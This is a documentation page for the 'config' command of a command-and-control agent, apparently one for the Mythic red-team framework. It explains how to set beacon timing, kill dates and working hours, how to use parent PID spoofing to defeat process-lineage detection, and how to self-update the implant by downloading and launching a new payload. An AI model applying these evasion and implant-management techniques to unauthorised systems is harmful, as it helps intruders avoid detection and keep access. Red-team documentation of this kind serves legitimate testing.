+++
title = "config"
chapter = false
weight = 126
hidden = false
+++

## Summary

View or modify the agent's runtime configuration, or replace the running agent binary with an updated version. Allows operators to adjust timing, kill dates, and working hours without rebuilding the payload. The `update` action downloads a new payload binary and launches it, replacing the current agent.

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | No | show | `show` displays current config, `set` modifies a value, `update` replaces the agent binary |
| key | No | | Config key to modify (required for `set`) |
| value | No | | New value (required for `set`) |
| file | For update | | New payload binary (Mythic file upload, required for `update`) |
| hash | No | | Expected SHA256 hash of the new binary (optional integrity check for `update`) |

### Settable Keys

| Key | Description | Example Values |
|-----|-------------|---------------|
| sleep | Sleep interval in seconds | `30`, `60` |
| jitter | Jitter percentage (0-100) | `20`, `50` |
| killdate | Agent expiration date | `2026-03-15`, `1741036800`, `disable` |
| working_hours_start | Working hours start (HH:MM) | `09:00`, `disable` |
| working_hours_end | Working hours end (HH:MM) | `17:00`, `disable` |
| working_days | Active days (ISO: Mon=1, Sun=7) | `1,2,3,4,5`, `all` |
| default_ppid | Parent PID spoofing for run/powershell | `1234`, `0`, `disable` |

## Usage

### Show current config
```
config
config -action show
```

### Modify sleep interval
```
config -action set -key sleep -value 30
```

### Set kill date
```
config -action set -key killdate -value 2026-03-15
config -action set -key killdate -value disable
```

### Set working hours
```
config -action set -key working_hours_start -value 09:00
config -action set -key working_hours_end -value 17:00
config -action set -key working_days -value 1,2,3,4,5
```

### Set default PPID (subprocess spoofing)
```
# Find explorer.exe PID
ps explorer

# Set PPID — all run/powershell commands will appear under this parent
config -action set -key default_ppid -value 1234

# Disable PPID spoofing
config -action set -key default_ppid -value disable
```

When `default_ppid` is set, child processes spawned by `run` and `powershell` commands use PPID spoofing via `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)`. This makes child processes appear as children of the specified PID (e.g., `explorer.exe`) instead of the agent process, defeating parent-child process relationship detection. Windows only; combines with BlockDLLs if both are active (T1134.004).

### Self-update agent binary
```
config -action update -file <upload_new_payload_binary>
config -action update -file <upload_new_payload_binary> -hash <expected_sha256>
```

The `update` action downloads the uploaded binary from Mythic, verifies it is a valid executable for the current OS (ELF/PE/Mach-O), optionally checks the SHA256 hash, writes it to a temp directory, launches it as a detached process, and exits the current agent. The new binary creates a separate callback.

{{% notice warning %}}The update action writes a binary to disk and creates a new process. EDR may flag the process chain. The old callback will go silent after the update. Build the new payload with the same C2 configuration for operational continuity.{{% /notice %}}

## MITRE ATT&CK Mapping

- T1134.004 — Access Token Manipulation: Parent PID Spoofing (when default_ppid is set)
- T1105 — Ingress Tool Transfer (self-update downloads new binary via C2 channel)
